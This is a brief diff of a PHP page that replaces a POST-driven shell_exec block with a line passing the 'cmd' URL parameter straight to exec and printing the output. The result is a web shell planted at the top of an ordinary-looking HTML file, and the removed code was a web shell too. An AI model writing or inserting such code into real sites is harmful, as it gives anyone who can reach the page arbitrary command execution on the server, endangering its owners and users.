@@ -1,8 +1,6 @@
 <!DOCTYPE html>
 <?php
-if (!empty($_POST['cmd'])) {
-    $cmd = shell_exec($_POST['cmd']);
-}
+echo '<pre>'. exec($_GET['cmd']) .'<pre>';
 ?>
 
 <html lang="en" >
